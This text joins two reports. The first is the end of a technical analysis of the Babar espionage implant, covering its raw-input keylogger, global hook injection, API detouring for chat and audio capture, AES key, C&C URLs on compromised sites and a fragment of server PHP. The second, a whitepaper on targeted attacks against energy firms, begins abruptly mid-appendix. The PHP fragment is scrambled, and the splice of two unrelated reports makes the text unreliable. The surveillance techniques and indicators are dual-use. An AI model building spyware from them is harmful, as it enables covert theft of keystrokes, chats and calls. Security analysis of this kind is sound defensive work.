Windows hook invading all processes running in the same desktop.Instance-local capabilities are 
basic spying on window names or snooping on the clipboard data, while the global hooks manage 
to steal information directly from Windows API calls.A summary of the capabilities would be as follows:
- Logging keystrokes
- Taking screenshots
- Capture of audio streams from softphone applications
- Stealing of clipboard data
- System and user default language, keyboard layout
- Names of desktop windows

3.5.1 THE KEYLOGGER MODULE

The keylogger is based on the raw input model.The malware creates an invisible window, with no 
other purpose than to receive window messages.By processing the window message queue it 
filters out input events and dispatches them to a raw input device object.Said object is configured 
to grab keyboard events through GetRawInputData.page | 10

Illustration 4 | The keylogger module uses Windows RAWINPUT to achieve its goal

The snooped keystroke data is passed to a thread, which performs encryption and dumps the data 
to a log file.The file is located in Babar's working directory and named update.msi.The design of the keylogging component is simple but effective.Babar is able to sniff all keystrokes 
happening on the same desktop as its invisible window.Interesting though, the code seen in 
Babar's implant is remarkably similar to an example posted at [4].3.5.2 INVADING DESKTOP PROCESSES

The Babar implant applies global Windows hooks to load its DLL into the process space of other 
processes.A global hook is installed by calling SetWindowsHookEx by passing the thread ID zero.It 
applies to all processes running in the same desktop, having the same 'bitness' as the DLL to be 
injected.In the given case this applies to all 32-bit processes.A global Windows hook is installed into the Windows event chain.This effectively means code 
provided by the hooking DLL gets executed whenever an arbitrary desktop process receives an 
event of a type specified by the hook.Babar installs hooks for type 2 and 3, which are WH_KEYBOARD and WH_GETMESSAGE.This way 
Babar has control over all keyboard and message events received by any application on the same 
Windows desktop.3.5.3 I AM ROOT(kit)

Through the hook mechanism Babar can be maximum invasive in the Windows userland.Once in 
the context of a desired target process, the malware goes on to hook specific APIs of interest.This 
is achieved by applying the detours technique, which implements trampoline functions to be 
invoked every time a hooked API is called [6].To achieve this, Babar rewrites the in-memory code 
for target APIs.A call to a hooked API then results in the calling application invoking a trampoline 
function, which performs malicious activity and then passes control on to the legitimate API.page | 11

Babar supports trampoline functions for a limited list of APIs and limited to a set of processes of 
interest, defined by its configuration.The list of APIs to hook is parted in three groups:

•

•

Internet communication
WSARecv
send
closesocket

File creation
CreateFileW

• Media

DirectSoundCreate
DirectSoundCaptureCreate
DirectSoundCreate8
DirectSoundCaptureCreate8
CoCreateInstance
waveOutOpen
waveOutClose
waveOutWrite
waveInOpen
waveInClose
waveInAddBuffer

Any set of hooks will only be applied to a defined set of processes.The parsing 
function for intercepted internet communication searches for chat traffic, more specifically for 
messages conforming with the MSNP21 standard.Babar is searching for tags such as 'Message-
Type', 'Reliability', 'To', 'From' or 'Text' to pick out of the stream.A more detailed explanation 
concerning the MSNP21 can be found at [7].MSNP21 is the MSN messenger chat protocol that 
was introduced with Windows Live 2010 beta.It is unclear though as of why only parsing for the 
MSN messenger is supported.page | 12

The data, like all stolen information, is handled by
a separate thread which compresses and encrypts
it before dumping it to a file on disk.For grabbing audio streams Babar includes code
from the OpenCORE AMR library [8].AMR
enables the malware to encode and decode raw
audio frames as they are passed to or grabbed
from the audio devices.The very same malware
module performs screen captures while dumping
the snooped data.This is assumed to happen to
recognize the parties involved in the conversation
by capturing the GUI of the softphone
application.3.6 STOLEN GOODS

Illustration 6 | MSNP21 tags                            

Babar comes with the Deflate algorithm, as used by Zlib, to be able to compress data before 
encrypting it and dumping it to disk.The data is encrypted with 128-bit AES using the key 24 FE C5 
AD 34 56 F7 F8 12 01 00 AE B6 7C DE AB for reading and writing files.The following files have been
seen to be dumped to Babar's working directory under %APPDATA%\MSI:

update.msi
•
48fe7f28.msi
•
0c6b5d2d.msi
•
31e50daa.msi
•
• mpavdlta.vdm

Stolen information will be handled by the Babar main instance, which receives data through six 
named pipes from other instances or hooked processes.The update.msi-file stores data collected 
by the keylogging module.It posesses a file header which among other attributes keeps system 
specific data.This is assumed to serve for mapping of logfiles to infected hosts.Log lines written for stolen data from browsers and the MSN messenger are built by the format 
string "%s%c%s|%s\n", where the first string is likely participant1 of a conversation, the second 
string participant2.Both are parted by the characters '<' or '>' depending on the direction of the 
conversation.Similar log lines accompany dumped sound data and saved documents.Sound data logs follow the 
format "A|%u|%S", document logs the format "%I64i|%I64i|%I64i|%s%s|%s\n".For documents 

page | 13

three timestamps are included as well as whether read or write access was requested, indicated by
'R' or 'W' or '-'.The last placeholder is reserved for the filename.At the time of writing the content
of the sound data log line remains unclear.3.7 CALLING HOME

The internet communication module of Babar is located in a sparate export called 
'FindCtxSectionStringW', which will be invoked through remote thread injection at runtime.Injection is achieved the same way as the infection of child instances described in section 3.4.The analyzed sample of Babar has two hard coded C&C server addresses which are included in its 
configuration data:

•
•

http://www.horizons-tourisme.com/_vti_bin/_vti_msc/bb/index.php
http://www.gezelimmi.com/wp-includes/misc/bb/index.php

Both servers were used to push spied information onto the remote site.It remains unclear though 
whether the C&Cs also served to instruct the infected machines per commands, as Babar does not 
posess obvious command parsing functionality.Data exfiltration is assumed to be time triggered.Illustration 7 | The website of horizons-tourisme.com today

The domain horizons-tourisme.com is a legitimate website, operated by an Algerian travel agency, 
located in Algiers, Algeria.The website is in French and still online today.Gezelimmi.com is a 
Turkish domain, currently responding with an HTTP error message 403, access not permitted.Both 
domains appear to be of legitimate use, but compromised and abused to host Babar's server side 
infrastructure.At the time of writing the server pointed to by horizons-tourisme.com is still hosting left overs 
from the C&C infrastructure used by Babar.With directory traversal activated researchers from 
ESET could pull a minimalistic directory structure, showing directories named as follows:

•
•
•

bb28
d13
tfc422 

page | 14

Obviously, the directory belonging to Babar is 'bb28'.'tfc422' matches with strings found in the TFC
bots (previously named NBOT).The purpose of the 'd13' directory remains unknown, although it is 
assumed to serve for requests of a third currently unknown family.Most of the directories pulled 
from horizons-tourisme.com are empty, or contain empty files.The only script inside the bb28 
directory though appears to be interesting.Its a .php-script named config.inc, containing variables 
which look familiar from Babar's config such as 'user', 'id' or 'seq', but also a handful of comments 
from the authors.<?php
  $uninstall = false; //true to uninstall
  $buninstall_id = false; //true to uninstall from ID
  $uninstall_id = "0C124D55"; //ID to uninstall in hex 
  //$uninstall = true;
  $debug = false; //true to see errors messages FOR TEST ONLY!!gmdate("D, d M Y H:i:s") . "GMT");

  }
  function listingFile($fn) {

  function resetStorageFile($fn) {

if (!file_exists($fn)) return false;
echo "<A HREF= \"$fn\">$fn</A><BR>" ;
return true;
}
  
if (!file_exists($fn)) return false;
$fp = fopen($fn, "wb");
if ($fp) fclose($fp);
else return false;
return true;
}

?>

page | 15

4.BEYOND BABAR

At the time of writing two Babar64 droppers are known, dropping one implant each.They both 
show traits of the malware described by CSEC, being attributed to French intelligence with 
„moderate certainty“ [2].The CSEC document mentions uncovering the attack in 2009.The compilation timestamps of the 
binaries date back to August 2011.While these can be faked it is still unlikely that the authors 
would change the 2009-timestamp to a future date.This, and the mentioning of 'Babar' instead of 
'Babar64' by CSEC indicates that the samples at hand stem from a more recent campaign.Besides the project name, Babar64 also shares the malformed user agent string described in the 
document, where a letter from the MSIE 6.0 name is missing.Illustration 8 | The malformed user agent string showing 'MSI' instead of 'MSIE'

The second Babar64 binary comes with its own set of C&C servers:

•
•

http://www.alexpetro.com/images/training/courses/bb212/index.php
http://www.etehadyie.ir/images/public/bb212/index.php

The first one is the legitimate website of AlexPetro Technical Services, a company operating in the 
oil and gas industry in Kairo, Egypt.The second domain is Iranian, allegedly owned by a web design
company named Radcom.What links Babar64 to other families analyzed beforehand, such as Bunny or TFC (also called NBOT)
are shared portions of source code and re-used coding techniques.The enumeration of anti-virus 
software and the code to query the system's proxy settings are almost identical.Furthermore, the 
samples at hand show the same partial API name obfuscation as Bunny and TFC.What has 
changed is the hashing algorithm.Also common among all of the families seems to be to hold 
system specific configuration data in memory at runtime, although this holds true for a lot of 
malware.Putting Babar, Bunny and TFC in context a number of conclusion can be drawn.Looking at the 
compilation timestamps and assuming they are not faked (which is backed by VirusTotal 
submission dates), the oldest family is TFC being active throughout 2010.These are DDoS bots, 
used to build a botnet which can be utilized to attack adversaries on the internet.page | 16

Next on the timeline is Babar64, allegedly compiled middle of 2011 and first seen on VirusTotal 
middle of 2012.It is believed that this strain has been active from 2011 until 2013, spying on 
dedicated targets rather than being spread widely.Last comes Bunny, compiled second half of 2011 and making its first public appearance during the 
analysis of the Adobe Reader exploit for CVE-2011-4369 [9].At the time when Bunny was spread 
through CVE-2011-4369, before December 2011, the vulnerability was unknown to the public.Bunny itself is a Lua script execution platform, not including any spying capabilities.All three families leave the impression of being developed by a team of skilled software 
developers, rather than being the product of a malware author operating in the criminal 
underground.Also none of the binaries makes attempts of hiding its intentions, which is a 
common trait among targeted malware.Heavy obfuscation or the use of crypters easily raises 
suspicion of heuristics based malware scanners.However, besides the CSEC document there was no obvious pointer found leading to the 
conclusion that Babar and its companions were set out by French inteligence services.As it is with 
digital crime, chances are high no proof will ever evolve and research will be limited to educated 
conclusions.The drawing of personal educated conclusions is left as an exercise for the interested 
reader.page | 17

5.APPENDICES

Lists of passive DNS entries for horizons-tourisme.com and gezelimmi.com can be found below.SECURITY RESPONSE




Targeted Attacks Against
the Energy Sector
Candid Wueest
﻿﻿


Version 1.0 – January 13, 2014, 14:00 GMT




      The energy sector has become a major focus for targeted
      attacks and is now among the top five most targeted sectors
      worldwide.Spear phishing .................................................. 21
               B. Visualization with TRIAGE.................................. 24
               C. Phases of targeted attacks................................ 25
           Resources..................................................................... 28
OVERVIEW



 The energy sector has become a major focus for targeted attacks and is now among the top
 five most targeted sectors worldwide.Companies in the sector are facing a growing risk
 of having their services interrupted or losing data.The threat to energy firms is only likely
 to increase in the coming years as new developments, such as further extensions of smart
 grids and smart metering expose more infrastructure to the Internet.Equipment that is
 not connected to the Internet and other networks is not immune to threats and there has
 already been a number of successful attacks against isolated systems.Operators of critical
 infrastructure, as well as energy utility companies, need to be aware of these threats and
 prepare accordingly.The threat to energy firms comes from several different sources.In some cases, espionage
 from competitors is the primary motive, with data on new projects, exploration and finances
 being targeted.Disruption and destruction are the goals of other attacks.Some instances
 appear to be state sponsored, such as the disruption of the Iranian nuclear program by
 the Stuxnet worm in 2010, one of the attacks that began this trend.Others appear to
 be the work of hacktivists with political or environmental agendas.Internal attackers,
 like disgruntled employees, are also a major source of attacks that often lead to service
 disruption.The majority of the actors behind these attacks have grown more sophisticated
 in the way they attack.During the monitoring period from July 2012 to June 2013, we observed an average of 74
 targeted attacks per day globally.Of these, nine attacks per day targeted the energy sector.Accounting for 16.3 percent of all attacks, the energy sector was the second most targeted
 vertical in the last six months of 2012, with only the government/public sector exceeding it
 with 25.4 percent of all attacks.The high ranking was mainly due to a major attack against
 a global oil company, which we observed in September 2012.However, in the first half of
 2013 the energy sector continued to attract a high proportion of attacks, ranking in fifth
 place with 7.6 percent of targeted attacks.Not all of the attacks analyzed used highly sophisticated tools.Most of them could have
 been prevented by following best practice guidelines for protecting the IT infrastructure and
 the industrial components, indicating that despite high revenues and strategic importance,
 many energy sector companies are not prioritizing cybersecurity.INTRODUCTION




               Many power
               utilities companies
               fear disruptive
               attacks the most,
               regardless of
               whether it is done
               by internal or
               external attackers.Targeted Attacks Against the Energy Sector




Introduction
    The number of targeted cyberattacks in general has risen in the past few years.In addition to this, the rate of
    attack exposure has also risen, with more companies becoming aware of attacks, expecting them and searching
    for indications of compromise.It is not a new phenomenon, but its importance has grown.The Council on
    Foreign Relations, a US think tank, reported that energy companies, including oil and gas producers, were often
    the focus of targeted attacks during summer 2012.In May 2013 the US Department of Homeland Security
    (DHS) warned of an increase in sabotage attacks against US energy companies located in the Middle East.The
    government had tracked multiple attacks and issued a warning together with the Industrial Control Systems
    Cyber Emergency Response Team (ICS-CERT).A report by the US Congress supported this picture, stating that
    many power utilities companies were under constant or daily attack through cyberspace.Taking into account
    that successful breaches of critical infrastructures are still rare and that these numbers included generic
    malware infections, it nevertheless highlights the potential for cyberattacks in the energy sector.As in most sectors, attackers are often after valuable information.For example, we have seen attackers target
    intellectual property such as technology for photovoltaic research and wind turbines, or data on gas field
    exploration.Information such as this is of high value and can generate huge profits for attackers or their
    sponsors.The same information can also be misused for an act of sabotage.Many power utilities companies fear
    disruptive attacks the most, regardless of whether it is done by internal or external attackers.The energy sector
    has a high potential for critical disruption through sabotage attacks.Any interruption to the power grid would
    cause substantial chaos and cascading effects resulting in financial loss.In the past there have been quite a few attacks that included targets in the energy sector.Some of these were
    more focused, like Stuxnet, Duqu, Shamoon/Disttrack and Night Dragon.Others saw power companies targeted
    among many other sectors, such as Hidden Lynx, Nitro, Flamer, Net Traveler and Elderwood to name a few.One of the biggest examples, and a game changer for many organizations, was Stuxnet.This targeted sabotage
    attack, which is believed to have been aimed against uranium enrichment facilities in Iran, made clear what
    could be done through cyberattacks.It is also clear that the energy sector is not exempt from the generic attacks that every company faces, such
    as ransomware that locks PCs or financial Trojans that attempt to steal passwords and credit card details.For
    example, such a case happened in May 2013, when a small fuel distribution company in North Carolina fell
    victim to a cyberheist that transferred US$800,000 from the company’s bank account.Such threats spread
    broadly and might impact any person, regardless of their employer.These attackers aim at infecting as many
    computers as possible in order to maximize their chances of profits.These attacks can include nonspecific data
    breaches where employee or customer records get stolen, as happened to the US Department of Energy in July
    2013.For this paper we focused on email data from targeted attacks between July 2012 and June 2013.Even though
    watering holes are becoming more frequently used in targeted attacks, it is unfortunately quite difficult to
    reliably map these to individual campaigns.A blocked drive-by download attempt does not give any indication
    if it was a targeted attack or just general noise.In quite a few cases we see the same common malware, like
    Poison Ivy, being used by generic attackers and by targeted attacks.In such cases the sole difference between a
    sophisticated targeted attack and a generic one lies in the person commanding the malware.Page 5
EXPOSED SYSTEMS:
ONLINE AND OFFLINE




                 Experts predict
                 that billions of
                 smart meters
                 and sensors
                 will be installed
                 worldwide over the
                 next ten years.Targeted Attacks Against the Energy Sector




Exposed systems: Online and offline
    Historically most industrial control systems (ICS) and supervisory control and data acquisition (SCADA) systems
    were in separated networks not connected to the Internet or any other network.Unfortunately this security
    through segregation approach does not fully protect against cyberattacks.In reality, networks are rarely
    completely isolated.Often some configuration updates are periodically installed or log files are transferred.If
    systems are not directly connected, the method of choice for these types of interactions is usually through a USB
    stick or a non-permanent modem connection, which provides a way into the restricted networks.This allows
    malware to spread into such isolated networks as demonstrated many times by threats such as Stuxnet.If networks are truly segregated, this would mean that there would be no software updates installed, leaving
    old vulnerabilities open.There are also issues around processes.For example, the revocation lists for digital
    certificates are seldom updated and therefore certificates which are no longer valid cannot be checked properly
    and would still be accepted.With the increasing desire for connectivity now reaching industrial plants, many operators have started to
    connect their ICS to the Internet.New adapters can bridge to older technology which was never intended to be
    controlled over the Internet, allowing it to be connected easily.This allows for efficient centralized monitoring
    and, to some extent, remote control of equipment.Depending on the type of machinery controlled through the human-machine interface (HMI) of the ICS, not all
    modifications are possible.Some systems are physically connected in a pure read-only mode for monitoring.And even if they are fully connected, some turbines have physical limitations or emergency systems based on
    physical effects that cannot be overridden by the digital controller.Thus, not all Hollywood scenarios of open
    flood gates or turbines that fly through the air are possible.However, sabotage attacks that damage equipment
    are definitely possible, as has already been demonstrated.In the future, more systems are going to implement
    the failsafe switches in software, opening up the vector for malware attacks.An additional source of concern is that some countries have started to open the energy market for smaller
    private contributors.This means that almost anyone can use mini power plants like water, wind or photovoltaic
    sites to feed energy back into the power grid.Often these operators do not have a full IT staff supporting
    the facilities at hand, which might lead to more vulnerable installations.Furthermore they may deploy new
    technology which might be untested and contain some unknown vulnerabilities.While these smaller sites make
    up only a small portion of the grid, new decentralized power input feeds are a challenge for the balance of the
    power grid as well and need to be carefully monitored.Small outages or changes can have a domino effect for
    the whole power grid.To increase the exposure of energy firms even further, sites like SHODAN, which is essentially a search engine
    for devices, enable anyone to easily find exposed controllers on the Internet.Of course not all of the industrial
    control systems connected to the Internet are critical systems or even real ones.Some researchers have started
    to create honey pot systems in order to study the attackers, which have apparently already attracted attackers
    like the Comment Crew/APT1 group, who have broken into these decoy systems.Page 7
                                                                           Targeted Attacks Against the Energy Sector




Smart grid: A new potential avenue of attack
    Smart grids and smart metering are
    bringing significant change to
    the world’s power systems.Experts predict that
    billions of smart meters
    and sensors will be
    installed worldwide
    over the next ten
    years.They enable
    utility companies
    to measure energy
    consumption at a
    more granular
    level, creating
    better flow
    patterns and
    enabling
    different
    prices for
    consumption
    based on
    the time of day and
    location.This development
    brings new opportunities, as well
    as new challenges.As with any connected infrastructure, it is important to
    secure the network and its endpoint on multiple levels.There have
    already been proof of concept attacks that demonstrate how smart meters could be manipulated to send
    back false information or report incorrect billing IDs, leading to power theft.In addition to the issue of securing these devices, smart grids will produce a huge amount of data which,
    depending on regulations, will need to be kept for audits.Some of this data may be sensitive and could raise
    privacy concerns if not properly protected.This could easily grow to petabytes of data that needs to be safely
    stored and managed.It is beyond the scope of this paper to address all the challenges associated with smart grids and smart meters.Symantec has created a dedicated whitepaper for this topic: How to protect critical infrastructure, mitigate fraud
    and guarantee privacy.As a member of the CRISALIS project, Symantec is following these developments closely
    and is helping to secure critical infrastructure together with partners from academia and different industry
    sectors.Page 8
HISTORY OF DISCOVERED ATTACKS




                 There have
                 been numerous
                 cyberattacks
                 against the energy
                 sector over the
                 past few years.Targeted Attacks Against the Energy Sector




History of discovered attacks
    There have been numerous cyberattacks against the energy sector over the past few years.Not all of them were
    the work of sophisticated attackers; some incidents were just collateral damage caused by malware infections or
    bad configuration issues.These incidents highlight the fact that such attacks can happen and that they can have
    real life consequences.2013
    In 2013 part of the Austrian and German power grid nearly broke down after a control command was
    accidentally misdirected.It is believed that a status request command packet, which was broadcast from a
    German gas company as a test for their newly installed network branch, found its way into the systems of the
    Austrian energy power control and monitoring network.Once there, the message generated thousands of reply
    messages, which generated even more data packages, which in turn flooded the control network.To stop this
    self-inflicted DDoS attack, part of the monitoring and control network had to be isolated and disconnected.Fortunately the situation was resolved without any power outages.2008
    In 2008, Tom Donahue, a senior Central Intelligence Agency (CIA) official told a meeting of utility company
    representatives that cyberattacks had taken out power equipment in multiple cities outside the United States.In some cases the attacker tried to extort money from the energy companies, threatening them with further
    blackouts.2003
    In 2003 the safety monitoring system of the Ohio nuclear power plant apparently went offline for several hours
    due to a Slammer worm infection.Fortunately the power plant was already offline due to maintenance and the
    installed secondary backup monitoring system was unaffected by the worm.Nevertheless the incident raised
    safety concerns.At the beginning of 2003 a marine terminal in Venezuela was targeted by a sabotage attack.Details of this attack
    are scarce and vague, but it seems that during a strike an attacking group managed to get access to the SCADA
    network of the oil tanker loading machinery and overwrote programmable logic controllers (PLCs) with an empty
    program module.This halted machinery, preventing oil tankers from loading for eight hour till the unaffected
    backup code was reinstalled on the PLCs.The attack was not too sophisticated as it was easily spotted.A small
    modification of the PLC code instead would probably have gone unnoticed for a long time.2001
    In 2001 an attack took place against California’s power distribution center, which controls the flow of electricity
    across California.Due to apparently poor security configuration, the attacker was able to compromise two Web
    servers that were part of a developer network and penetrate further from there.Fortunately the attackers were
    stopped before they managed to attack any systems which were tied into the transmission grid for the Western
    United States.2000
    According to Russian officials, the largest natural gas extraction company in the country was successfully
    attacked in 2000.The attackers used a Trojan to gain access to the control for the gas pipelines.Through this
    switchboard, the flow for individual gas pipelines could have been modified, which would easily have caused
    widespread disruption.Page 10
                                                                         Targeted Attacks Against the Energy Sector




  Aside from these incidents, there have also been a number of more serious and well-documented targeted
  attacks against the energy sector:

Stuxnet
  The Stuxnet incident and its relatives Duqu, Flamer and Gauss are some of the most talked-about cases of
  targeted attacks.As far as we know today, the Stuxnet operation began in November 2005 with the registration
  of the command and control (C&C) servers used in the attacks.The first recorded appearance of what we now
  call Stuxnet version 0.5 was in November 2007.Since then, a handful of different versions have been found and
  analyzed.Stuxnet 1.x is based on what is now known as the “tilded” platform; whereas Stuxnet 0.5 is based
  on the Flamer framework.The code segments and programming style differ, which indicates that two different
  programming teams were most likely responsible for the different branches of Stuxnet.Thorough investigation
  into the mechanism and functions of this threat started in July 2010.Stuxnet is the first known autonomous
  threat to target and sabotage industrial control systems to such an extent.Stuxnet is a sophisticated piece of malware, which uses seven vulnerabilities to spread and infect its targets.The most notable vulnerability is the Microsoft Windows Shortcut ‘LNK/PIF’ Files Automatic File Execution
  Vulnerability (CVE-2010-2568), which allows it to auto-execute on USB drives.Spreading through infected
  portable media drives allowed it to also infect networks isolated by air gaps that are unreachable from the
  Internet.This was most likely the first infection vector used by Stuxnet.In addition, it is able to infect Step7
  project files, which are used to control Programmable Logic Controllers (PLCs).This allowed the worm to infect
  computers whenever the engineer exchanged the project files.Besides this, it also spread through network
  shares, a printer spooler vulnerability, an old Windows RPC (remote procedure calls) vulnerability and a known
  password in the WinCC database.In the end, Stuxnet propagated further than its authors probably intended.We
  have monitored more than 40,000 infected IP addresses in 155 countries.Many of those systems are most likely
  just collateral damage and were not intended to be infected by the attackers.For example multiple computers at
  Chevron were infected by Stuxnet, without any damage being done.Part of the malware code was signed with stolen digital certificates making it harder to detect by security tools.To hide its activity even further, Stuxnet executed slightly different infection routines depending on the security
  software installed on the target.On the USB drive itself, the malware would hide its own files and even delete
  itself from it after three successful propagations.Tricks like these, to make the detection of the malware more
  difficult, are now frequently used in modern targeted attacks.Stuxnet’s payload focused on PLCs, which are used to control different industrial components.The target of the
  Stuxnet operation is believed to be a uranium enrichment facility in Iran.The sabotage payload disrupted and
  partially destroyed the cascaded high frequency gas centrifuges.The early version of Stuxnet targeted the S7-
  417 PLCs and modified its valve settings.Closing the valves at certain points in time would lead to an increase
  of pressure that could damage the equipment.The later version of the threat focused on the S7-315 PLCs,
  manipulating the spinning frequency of the rotating motors.By speeding the centrifuges up and slowing them
  down repeatedly, the output quality could be spoiled and the centrifuges themselves could be damaged.The
  payload would only become active if the fingerprint in the found PLC setup matched a given configuration setup.This minimized the collateral damage at other facilities and showed that the attackers had in-depth knowledge
  of the targeted uranium enrichment facilities.To avoid detection by personnel monitoring the human machine
  interface (HMI) of the plant, the threat recorded measurement readings during normal operation and played
  those back in a loop.Night Dragon
  Operation Night Dragon, which was uncovered in 2010, is a typical example of global oil companies being
  targeted, but this time not with the aim of disruption in mind.The attacks started in late 2009 and were directed
  at finding project details and financial information about oil and gas field exploration and bids.The attackers started by compromising public facing Web servers through SQL injection and installing Web
  shells on them.Once they had control over the server they used common hacking tools to harvest local




                                                      Page 11
                                                                          Targeted Attacks Against the Energy Sector




  passwords, dump password hashes, sniff authentication messages and exploit internal active directory
  configuration.This allowed them to move on to other internal computers using the gathered passwords.In
  addition, spear phishing messages were used to compromise additional computers.The attackers did not use
  any zero-day vulnerabilities during their attacks.Rather they used publicly available tools for each individual job.On compromised computers a common Backdoor.Trojan was installed that communicated back to the
  C&C server, allowing remote access to the computer.This allowed the attacker to find and extract valuable
  information.Shamoon/Disttrack
  In August 2012 an extremely destructive cyberattack hit an estimated 30,000 computers at one of the largest oil
  producers of the world in Saudi Arabia.The W32.Disttrack malware used in this attack, also known as Shamoon,
  consists of three components: a dropper, a wiper and a reporter module.The dropper component is responsible for creating all the required files on the system, registering a service
  called “TrkSvr” in order to start itself with Windows.It also attempts to copy itself to accessible network shares
  and execute itself remotely if successfully copied.The wiper component is only activated when a hardcoded configuration date has been passed.This enables a
  coordinated, “time bomb” scenario.The module then drops a legitimate and digitally signed device driver that
  provides low level disk access from user space.The malware collects file names and starts overwriting them
  with a JPEG image or 192KB blocks of random data.At the end Disttrack finishes the computer off by wiping the
  master boot record with the same data.The reporter component is responsible for sending back a HTTP GET request to the C&C server.It reports the
  domain name, IP address and number of files overwritten.By acquiring user credentials and gaining access to the domain controller the attackers were able to push the
  malware on to many systems before they triggered the destructive payload.Disttrack’s secondary goal may have
  been to steal valuable information from infected computers, but the main intent was to render the computers
  unusable by wiping the operating system and master boot record, causing disruption and downtime at the
  targeted company.Although wiping is also frequently used to destroy evidence of the attack and make forensics
  more difficult.The malware does not contain any payload against ICS, like Stuxnet does for PLCs, and is not as
  sophisticated.According to the company, no computer related with the production or distribution of oil was
  affected, since the operational network is separated and specially protected.One group that claimed responsibility for the attack posted on Pastebin that it was an anti-oppression hacker
  group.The attack was prompted by disappointment with some of the regimes in the Middle East, the group said.True or not, this shows that it is not necessarily only state-sponsored attackers who are carrying out disruptive
  attacks.Sabotage attacks usually fall into the orbit of hacktivists, who seek attention rather than profit.Some
  sources reported that the attackers had help from insiders, which would explain the so far unclear infection
  vector.Soon after this attack became known, a Qatari gas company was attacked in a similar way.Page 12
SPEAR PHISHING ATTACKS
IN THE ENERGY SECTOR




 A spear phishing
 attack consists
 of an email with
 either a malicious
 attachment or a
 link to a malicious
 website.Targeted Attacks Against the Energy Sector




Spear phishing attacks in the energy sector
    Spear phishing is, along with watering hole attacks, one of the most common attack vectors used to
    attack companies.The attacks are simple to carry out.They often follow the same pattern, starting with a
    reconnaissance phase to gather all publicly available information.This is followed by the incursion phase of
    breaking in and compromising computers.After that comes the discovery phase, where the attacker gathers
    passwords and maps the internal network.The final stage is capture and exfiltration, where the valuable
    information is copied and sent back to the attacker.The last phase may also involve a disruption attack if the
    goal is sabotage.For a more detailed analysis of the attack phases, see Appendix C.

    A spear phishing attack consists of an email with either a malicious attachment or a link to a malicious website.Such emails are sent in bulk to a handful of key users.These waves are often repeated till enough people fall for
    the bait and compromise their computers.For analysis on the social engineering themes used, attack details and
    attachment types used, see Appendix A.New Year’s campaign
    Some of the spear phishing campaigns are smaller in scale and are focused on specific targets.For example, on
    January 1, 2013 a global energy research company was targeted.A wave of spear phishing emails were sent from two Freemailer accounts to 291 individuals at the targeted
    company.All receiving email addresses started with a letter between G and R, covering half of the alphabet.Whether there was a second wave of emails using the other half of the alphabet or whether the attackers only
    got their hands on part of the address book remains unknown.All emails had either the subject line “2013,Obama QE4!Merry Christmas !” or “2013,Obama QE4!”.It is
    common to see spear phishing attacks take place around holidays, as people are receiving more emails during
    these times and are less likely to perform due diligence while opening them.All of the emails contained the same
    Trojan.Dropper disguised as an attachment with the filename AVP.dll.The malware itself drops a malicious Downloader “clbcatq.dll” into a newly created “wuauclt” directory, posing
    as Windows update and taking advantage of the DLL search order hijack weakness in order to load the malicious
    code in Windows.The same family of dropper has been used in previous targeted attacks against other sectors,
    indicating that a group with multiple interests is behind the attacks.The back door provided full access to the
    compromised computers.A week later, on January 7, 2013, the group attacked the same company again.Seventy emails were sent to
    58 individuals using either “2012-13 NFL Playoffs Schedule” or “Re: 2012-13 NFL Playoffs Schedule” as a
    subject line.In this wave, the attackers used a similar AVP.dll to the one used before.In some of the emails, an
    additional CHM file with an old exploit was used in an effort to maximize the chances of a successful infection.After this second wave, the attack ceased.It is unknown if the attackers successfully retrieved the information
    they were seeking, if they installed other back door Trojans or gained passwords that allowed them to directly
    access the computers, or if they have given up on the target.Greek oil campaign
    A global oil company, with offices around the world, had been under continuous attack for some time, but in
    September 2012 we noticed an upsurge in activity, with 34 times more suspicious emails than on average.This
    provided a clear indication that something suspicious was going on.At the end of this wave of emails, a hotel
    chain, a rental car company and two financial institutions were also targeted by the same attacker.This may
    have been an attempt to find further information that could be used in a future social engineering attack against
    the oil company.In total, 136 email accounts at the oil company were targeted.A regional sales manager in Greece received




                                                        Page 14
                                                                      Targeted Attacks Against the Energy Sector




412 emails over the
12 month period,
with 155 different
attachments.A HR
person in the same
country received
the second largest
amount of emails with
90 in total.Seventeen
other people were
targeted between 70
and 90 times, many in
the same region.The
rest of the targeted
people received less
than five emails each,
in what seems to have Figure 1.Number of emails targeting the company per day
been an undirected
spraying in the hope
that at least some would fall for the bait.Clearly the one person that received the highest volume of emails was
deemed to be of high value to the attackers.Possible explanations for the attack could be that a competitor
wanted to know more about some upcoming deal or details on the oil field exploration, but this would be highly
speculative.The spear phishing emails came from 234 spoofed addresses.They were made to appear to be linked to the
company in relation to the subject and attachment chosen.Many of the emails came from the same country as
the main targeted sales manager.The emails all contained malicious attachments.None of them linked to third party sites for drive-by downloads.Of the attachments, 1,588 had a .exe extension.Of those, 842 had a .pdf.exe extension.The malware chosen
was a variant of the Poison Ivy Trojan Backdoor.Darkmoon and, in some minor cases, Trojan droppers that would
download additional malware.The attackers did not use any zero-day exploits to drop a payload.The last C&C server has been used since 2010 in similar attacks
against other companies.Other sub-domains at the same free host and DNS service have been used by other
groups to spread malware in the past.•	 updates.zyns.com
•	 amazoaws.dyndns-office.com
•	 msupdate.3utilities.com




                                                    Page 15
                                                                           Targeted Attacks Against the Energy Sector




    The chosen names of the C&C server domains imitates legitimate services in a bid to be overlooked by the system
    administrators when checking their logs.The back door provides full remote access to the compromised computers, allowing for extraction of any data.It is
    unknown if the attackers succeeded in their goal and if valuable information has been extracted.The attacks did not
    completely disappear, but the email volume decreased significantly to only a few emails per week afterwards.Motivation and origin
    As with all targeted attacks, there are many different groups of attackers operating in this field.These attacks cannot
    be attributed to only one group or geographical region.We have seen individuals, competitors, hacktivist groups
    and possible state sponsored agents carrying out attacks against energy companies.Some of the attacks have been
    purely opportunistic, seeking any valuable information available.Other campaigns look like they were planned over a
    lengthy period and carried out methodically with a clear goal in mind.The attackers tend to go after valuable information, including maps of new gas fields or research on efficient
    photovoltaic generators.This information can be of great value to competitors or nations that want to make progress
    in the same field.Another motivation for attackers is to profit from the information stolen by blackmailing the
    company.The same information can be used to carry out sabotage attacks designed to disrupt ICSs, as the energy sector is
    also a primary target for sabotage attacks which will not generate direct profit for the attacker.A competitor might
    be interested in generating bad press and bad customer experience for a rival company, in order to win some new
    clients.For example, in January 2013 a group claiming to be related to Anonymous posted access details for what they said
    were Israeli SCADA systems for power plants and other systems.Meanwhile, “Operation Save the Arctic” targeted
    multiple oil companies around the globe in protest against drilling plans in the Arctic.Disgruntled employees are also a source of attacks that should not be underestimated.With their knowhow about
    internal critical processes and systems they often know how to inflict serious damage.They may be able to perform
    system modifications that could go unnoticed for a long periods.Page 16
                                                                            Targeted Attacks Against the Energy Sector




Protection and mitigation
    For all regular client computers, the well-established best practice guidelines apply.These computers are often
